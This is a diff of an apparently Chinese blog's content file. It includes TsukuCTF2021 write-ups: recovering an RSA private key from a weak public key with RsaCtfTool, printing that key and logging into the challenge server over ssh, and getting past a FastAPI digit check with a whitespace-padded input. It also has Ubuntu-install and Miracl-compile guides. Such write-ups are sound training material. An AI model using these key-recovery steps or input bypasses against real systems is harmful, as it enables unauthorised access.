+MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a
+alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2
+Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi
+gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj
+pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA
+I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM
+OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP
++WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/
+KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO
+OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO
+cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2
+/MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<pre><code class="shell">chmod 600 id_rsa
+ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa
+</code></pre>
+<p><strong>flag:</strong><code>TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125;</code></p>
+<h1 id="digits"><a href="#digits" class="headerlink" title="digits"></a>digits</h1><p><em>コンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。</em><br><em><a href="https://tsukuctf.sechack365.com/problems/digits">https://tsukuctf.sechack365.com/problems/digits</a></em></p>
+<hr>
+<p>访问<code>problems/digits</code>:</p>
+<pre><code class="json">&#123;
+    &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
+&#125;
+</code></pre>
+<p>题目给了源码：</p>
+<pre><code class="python">from typing import Optional
+from fastapi import FastAPI
+import random
+
+app = FastAPI()
+FLAG = &quot;TsukuCTF&#123;&#125;&quot;
+
+@app.get(&quot;/&quot;)
+def main(q: Optional[str] = None):
+    print(q)
+    if q == None:
+        return &#123;
+            &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
+        &#125;
+    if len(q) != 10:
+        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+    if &quot;-&quot; in q or &quot;+&quot; in q:
+        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+    try:
+        if not type(int(q)) is int:
+            return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+    except:
+        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
+
+    you_are_lucky = 0
+
+    for _ in range(100):
+        idx = random.randrange(4)
+        if q[idx] &lt; &quot;0&quot;:
+            you_are_lucky += 1
+        if q[idx] &gt; &quot;9&quot;:
+            you_are_lucky += 1
+
+    if you_are_lucky &gt; 0:
+        return &#123;&quot;flag&quot;: FLAG&#125;
+    else:
+        return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125;
+</code></pre>
+<p>要求找到查询参数q的值，满足:</p>
+<ul>
+<li><code>q != None</code></li>
+<li><code>len(q) == 10</code></li>
+<li>不包含<code>-</code>和<code>+</code></li>
+<li>可以使用<code>int(q)</code>进行转换</li>
+<li>至少包含一个0-9之外的字符</li>
+</ul>
+<p><code>python</code>中使用<code>int</code>进行强制类型转换时会忽略两侧的空格，提交<code>q=   4567890</code>即可</p>
+<pre><code class="json">&#123;
+    &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot;
+&#125;
+</code></pre>
+<p><strong>flag:</strong><code>TsukuCTF&#123;you_are_lucky_Tsukushi&#125; </code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>TsukuCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ThorCTF2021 Writeup</title>
     <url>/posts/1756116899/</url>
     <content><![CDATA[<h1 id="Shingeki-no-RSA"><a href="#Shingeki-no-RSA" class="headerlink" title="Shingeki no RSA"></a>Shingeki no RSA</h1><p><em>One encryption, three params, you know what to do.</em></p>
@@ -3297,213 +3507,50 @@ SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
   </entry>
   <entry>
-    <title>ThinkServer RD650安装Ubuntu Server 16.04</title>
-    <url>/posts/560540611/</url>
-    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
-<li>在Ubuntu官网上下载Ubuntu Server 16.04的ISO镜像(<a href="http://releases.ubuntu.com/16.04/">下载链接</a>)；</li>
-<li>使用刻录软件(如:软碟通)将iso镜像文件写入U盘中，制成启动盘；</li>
-<li>将ISO镜像文件拷贝至U盘的根目录，为了方便后续操作，这里可将镜像文件重命名为<code>Ubuntu.iso</code>；<span id="more"></span></li>
-</ol>
-<h2 id="设置引导"><a href="#设置引导" class="headerlink" title="设置引导"></a>设置引导</h2><ol>
-<li>按电源键开机，启动服务器(服务器启动可能会比较缓慢)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134039.jpg)</li>
-<li>出现此界面时，按&quot;F10&quot;进入TDM(ThinkServer Deployment Manager)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134100.jpg)</li>
-<li>进入TDM后，选择&quot;BIOS Setup(BIOS 设置)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134421.jpg)</li>
-<li>选择&quot;Boot Manager(引导管理)&quot;,将&quot;Boot Mode(引导模式)&quot;改为&quot;UEFI Only(仅UEFI模式)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134519.jpg)</li>
-<li>点击&quot;Save &amp; Reset(保存 &amp; 重启)&quot;,在弹出的对话框中选择&quot;Yes(是)&quot;重启电脑。如果出现如下对话框，选择&quot;No(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134545.jpg)</li>
-</ol>
-<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ol>
-<li>将U盘插入服务器后的USB插槽中，重启服务器，进入下图所示界面。选择&quot;Install Ubuntu Server(安装Ubuntu服务器版)&quot;；<br>注:若无法进入下图所示界面，请进入BIOS修改U盘为第一启动项。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165615.jpg)</li>
-<li>选择安装过程和系统的默认语言为&quot;English(英语)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165649.jpg)</li>
-<li>&quot;Select your location(选择你的区域)&quot;，这里选择&quot;Other(其他)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153430.jpg)</li>
-<li>&quot;Continent or region(大陆或地区)&quot;选择&quot;Asia(亚洲)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153439.jpg)</li>
-<li>&quot;Country(国家)&quot;选择&quot;China(中国)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153448.jpg)</li>
-<li>是否通过一系列的按键检测键盘布局，选择&quot;NO(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165712.jpg)</li>
-<li>字符集编码选择&quot;United States -en_US.UTF-8&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153454.jpg)</li>
-<li>&quot;Country or Region for the keyboard(键盘布局所属国家或地区)&quot;,选择&quot;English(US)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165717.jpg)</li>
-<li>&quot;Keyboard layout(键盘布局)&quot;，选择&quot;English(US)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165725.jpg)</li>
-<li>稍等片刻，将会显示出现错误,原因为:安装程序未检测到CD-ROM。是否重试，选择&quot;No(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165744.jpg)</li>
-<li>进入如下界面，选择&quot;Execute a shell(运行shell)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165801.jpg)</li>
-<li>在shell中依次输入如下命令:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /dev/sd*</span><br><span class="line">umount /dev/sdb4/</span><br><span class="line">mkdir udev</span><br><span class="line">mount /dev/sdb4 /udev</span><br><span class="line">mount /udev/ubuntu.iso /cdrom</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
-一般会出现两个<code>/dev/sdb*</code>项，我们选择带数字的那一项去替换上面代码中的<code>/dev/sdb4</code>;<br><code>ubuntu.iso</code>为U盘中Ubuntu Server的ISO镜像的文件名&quot;。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165911.jpg)</li>
-<li>进入如下界面后，选择&quot;Detect and mount CD-ROM(探测并挂载光盘)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165919.jpg)</li>
-<li>进入如下界面，选择&quot;Network interface(网络接口)&quot;，这里选择第一个网络接口，等待安装程序自动完成配置；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165949.jpg)</li>
-<li>设置&quot;Hostname(主机名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170037.jpg)</li>
-<li>设置&quot;Full name for the new user(新用户的全名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170121.jpg)</li>
-<li>设置&quot;Username for your account(你账号的用户名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170137.jpg)</li>
-<li>设置&quot;password for the new user(新用户的密码)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170145.jpg)</li>
-<li>如果所设置的密码较为简单，可能会弹出如下对话框，询问你是否使用一个&quot;weak password(弱口令)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170157.jpg)</li>
-<li>出现如下界面，询问你是否&quot;Encrypt your home directory(加密你的主目录)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170208.jpg)</li>
-<li>然后可能会出现时区设置错误，选择 &quot;Continue(继续)&quot;,进入如下界面，选择&quot;Install the system(安装系统)&quot;,然后直接回车，选择&quot;Partion disks(磁盘分区)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170228.jpg)<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170234.jpg)</li>
-<li>出现下图界面，询问你是否&quot;Umount partitions that are in use(卸载正在使用的分区)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170255.jpg)</li>
-<li>选择&quot;Partitioning method(分区方法)&quot;，这里我们选择&quot;Guided - use entire disk and set up LVM(使用整个磁盘并配置LVM)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170318.jpg)</li>
-<li>&quot;Select disk to partition(选择要分区的磁盘)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170325.jpg)</li>
-<li>选择&quot;Partitioning Scheme(分区方案) &quot;，这里推荐选择&quot;All files in one partition(所有文件放在同一分区)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170331.jpg)</li>
-<li>出现如下界面，询问你是否&quot;Write the changes to disks and configure LVM(将修改写入磁盘并配置LVM)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170342.jpg)</li>
-<li>设置&quot;Name of the volume group for the new system(新系统的卷组名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170359.jpg)</li>
-<li>设置&quot;Amount of volume group to use for guided partitioning(用于分区引导的卷组数)&quot;，默认大小即可，无需修改；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170421.jpg)</li>
-<li>出现下图界面，询问你是否&quot;Umount partitions that are in use(卸载正在使用的分区)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170434.jpg)</li>
-<li>出现如下界面，询问你是否&quot;Force UEFI installation(强制UEFI安装)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170442.jpg)</li>
-<li>出现如下界面，询问是否&quot;Write the changes to disks(将改动写入磁盘)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170452.jpg)</li>
-<li>&quot;Kernel to install(要安装的内核)&quot;,选择默认的&quot;Linux-generic&quot;即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170544.jpg)</li>
-<li>回车后出现如下界面，这里要选择包含在initrd中的驱动程序，选择默认的&quot;generic:include all available drivers(通用:包含所有可用的驱动程序)&quot;即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170555.jpg)</li>
-<li>&quot;HTTP proxy information(HTTP代理信息)&quot;不写，直接回车即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170657.jpg)</li>
-<li>询问你管理系统更新的方式，选择&quot;No automatic updates(不自动更新)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170737.jpg)</li>
-<li>&quot;Choose software to install(选择要安装的软件)&quot;，建议勾选上&quot;OpenSSh server&quot;，然后回车;<br>选择方法为:通过键盘上下键移动光标至选要择项，在要选择的项上按空格即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724154325.jpg)</li>
-<li>回车后，显示安装完成，继续回车，重启系统，此时就可以拔掉U盘；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170940.jpg)</li>
-<li>重启后，再次进入TDM，将&quot;Boot Mode(引导模式)&quot;改为&quot;Legacy　Only(仅Legacy模式)&quot;，否则有可能出现不能进入Linux系统的情况；</li>
-</ol>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Ubuntu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TsukuCTF2021 Writeup</title>
-    <url>/posts/434189373/</url>
-    <content><![CDATA[<h1 id="CrackSSH"><a href="#CrackSSH" class="headerlink" title="CrackSSH!"></a>CrackSSH!</h1><p><em>調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが...。なんとかして侵入しなければ。</em><br><em>Target: frt.hongo.wide.ad.jp</em><br><em>Port: 30022</em></p>
-<hr>
-<p>题目中给了一个公钥:</p>
-<pre><code class="asciiarmor">ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp
-</code></pre>
-<p>参考知乎(<a href="https://zhuanlan.zhihu.com/p/33949377">ssh-keygen生成的id_rsa文件的格式</a>)上的的一篇文章:</p>
-<p>首先,<code>awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C</code>,得到:</p>
-<pre><code class="assembly">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 81 01  |....ssh-rsa.....|
-00000010  62 80 d6 16 23 ba f8 71  8b 00 86 2a c1 be 9d b2  |b...#..q...*....|
-00000020  e3 fe 26 32 ea 94 70 92  49 1a eb 82 7a 2f e5 4b  |..&amp;2..p.I...z/.K|
-00000030  3e 9e 0a dc 95 52 44 41  33 9b 3b 40 5b 18 e4 84  |&gt;....RDA3.;@[...|
-00000040  63 a5 7a 89 77 bf 30 d1  a9 1d 89 fb 89 d2 54 e2  |c.z.w.0.......T.|
-00000050  3d 16 12 72 88 17 52 80  40 a6 5c 96 28 8c 65 52  |=..r..R.@.\.(.eR|
-00000060  53 9e 9b 08 c7 5c ca c1  24 29 85 73 e5 ed 3e c5  |S....\..$).s..&gt;.|
-00000070  00 23 64 3a e8 b6 99 be  15 3d 15 01 dc 1d 5a e6  |.#d:.....=....Z.|
-00000080  4c eb cc d9 63 c0 c4 f4  7d ae a3 d7 5a 1c 27 ff  |L...c...&#125;...Z.&#39;.|
-00000090  00 00 00 81 02 01 f9 8f  ba 8e 6f 71 bc d8 9b 9d  |..........oq....|
-000000a0  92 c8 a0 0b c8 56 fd 46  7e 56 e3 43 90 28 2a 9e  |.....V.F~V.C.(*.|
-000000b0  76 c8 fa be de 74 6b d4  dd 5a 6a 55 e1 1d 5d 69  |v....tk..ZjU..]i|
-000000c0  5d cc 1a d7 2a da f3 5f  83 14 3b 2e e1 b7 69 3c  |]...*.._..;...i&lt;|
-000000d0  2e df db 9a 4b ae 20 59  29 a4 8d 4f b2 b4 fa c4  |....K. Y)..O....|
-000000e0  50 74 fe 74 88 16 98 8e  c1 76 0b 28 3c 1e 3a 1e  |Pt.t.....v.(&lt;.:.|
-000000f0  19 a5 d5 92 1d db 3b 0d  95 d9 6c 14 b1 4e 2a 12  |......;...l..N*.|
-00000100  bf 53 8c f6 cc ce b0 82  c6 41 43 40 f9 f0 3b 09  |.S.......AC@..;.|
-00000110  a2 59 03 3c 19                                    |.Y.&lt;.|
-00000115
-</code></pre>
-<ul>
-<li><p>前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是<code>ssh-rsa</code>的ASCII码</p>
-</li>
-<li><p>接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制</p>
-</li>
-<li><p>再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制</p>
-<pre><code class="shell">~$ echo &quot;$((16#00000081))&quot;
-129
-~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;)
-~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e
-0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c
-~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n
-bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021
-</code></pre>
-</li>
+    <title>Windows下编译Miracl密码库</title>
+    <url>/posts/2543483413/</url>
+    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。</p>
+<h1 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h1><ul>
+<li><a href="http://www.codeblocks.org/downloads">CodeBlocks</a></li>
+<li><a href="https://gitforwindows.org/">Git Bash</a><span id="more"></span></li>
 </ul>
-<blockquote>
-<p>官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式</p>
-<pre><code class="shell">~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse
-    0:d=0  hl=4 l= 264 cons: SEQUENCE          
-    4:d=1  hl=3 l= 129 prim: INTEGER  :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19
-  136:d=1  hl=3 l= 129 prim: INTEGER  :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF
-</code></pre>
-</blockquote>
-<p>使用<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>生成私钥,保存至<code>id_rsa</code></p>
-<pre><code class="shell">python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private
-</code></pre>
-<pre><code class="asciiarmor">-----BEGIN RSA PRIVATE KEY-----
-MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a
-alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2
-Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi
-gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj
-pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA
-I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM
-OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP
-+WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/
-KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO
-OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO
-cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2
-/MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X
------END RSA PRIVATE KEY-----
-</code></pre>
-<pre><code class="shell">chmod 600 id_rsa
-ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa
-</code></pre>
-<p><strong>flag:</strong><code>TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125;</code></p>
-<h1 id="digits"><a href="#digits" class="headerlink" title="digits"></a>digits</h1><p><em>コンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。</em><br><em><a href="https://tsukuctf.sechack365.com/problems/digits">https://tsukuctf.sechack365.com/problems/digits</a></em></p>
-<hr>
-<p>访问<code>problems/digits</code>:</p>
-<pre><code class="json">&#123;
-    &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
-&#125;
-</code></pre>
-<p>题目给了源码：</p>
-<pre><code class="python">from typing import Optional
-from fastapi import FastAPI
-import random
-
-app = FastAPI()
-FLAG = &quot;TsukuCTF&#123;&#125;&quot;
-
-@app.get(&quot;/&quot;)
-def main(q: Optional[str] = None):
-    print(q)
-    if q == None:
-        return &#123;
-            &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
-        &#125;
-    if len(q) != 10:
-        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-    if &quot;-&quot; in q or &quot;+&quot; in q:
-        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-    try:
-        if not type(int(q)) is int:
-            return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-    except:
-        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
-
-    you_are_lucky = 0
-
-    for _ in range(100):
-        idx = random.randrange(4)
-        if q[idx] &lt; &quot;0&quot;:
-            you_are_lucky += 1
-        if q[idx] &gt; &quot;9&quot;:
-            you_are_lucky += 1
-
-    if you_are_lucky &gt; 0:
-        return &#123;&quot;flag&quot;: FLAG&#125;
-    else:
-        return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125;
-</code></pre>
-<p>要求找到查询参数q的值，满足:</p>
-<ul>
-<li><code>q != None</code></li>
-<li><code>len(q) == 10</code></li>
-<li>不包含<code>-</code>和<code>+</code></li>
-<li>可以使用<code>int(q)</code>进行转换</li>
-<li>至少包含一个0-9之外的字符</li>
+<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><ol>
+<li>从Github上下载项目最新源码。(<a href="https://github.com/miracl/MIRACL/archive/master.zip">下载地址</a>)</li>
+<li>打开Git Bash,创建一个文件夹<code>miracl</code>，并将压缩文件拷贝至此。<br><code>mkdir miracl</code></li>
+<li>打开Git Bash，输入如下命令，将所有文件解压到一个目录中。<br><code>unzip -j -aa -L master.zip</code></li>
+<li>编辑<code>gcdoit.bat</code>，注释掉最后几行并保存。<img data-src="/posts/2543483413/pasted-1.png" class=""></li>
+<li>执行<code>gcdoit.bat</code>,生成的<code>miracl.a</code>即为编译好的库。</li>
+</ol>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><ol>
+<li><p>打开CodeBlocks，新建Console application项目。</p>
+<img data-src="/posts/2543483413/pasted-2.png" class=""></li>
+<li><p>将<code>mirdef.h</code>、<code>miracl.h</code>、<code>miracl.a</code>拷贝至项目根目录。</p>
+</li>
+<li><p>对着CB左侧工作空间中的项目名右键，点击添加文件,将上述三个文件添加至项目中。</p>
+<img data-src="/posts/2543483413/pasted-3.png" class=""></li>
+<li><p>CB会弹出如下错误提示,莫慌.</p>
+<img data-src="/posts/2543483413/error.png" class=""></li>
+<li><p>对着CB左侧工作空间中的项目名右键,点击生成选项,修改链接器设置.</p>
+<img data-src="/posts/2543483413/pasted-4.png" class="">
+<div class="note warning">
+            <p>环境设置选择: 仅使用项目选项</p>
+          </div></li>
+<li><p>在<code>main.c</code>中输入如下代码，进行测试。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;miracl.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    big x,y,z;</span><br><span class="line">    miracl *mip = <span class="built_in">mirsys</span>(<span class="number">1000</span>, <span class="number">16</span>);</span><br><span class="line">    x= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    y= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    z= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span 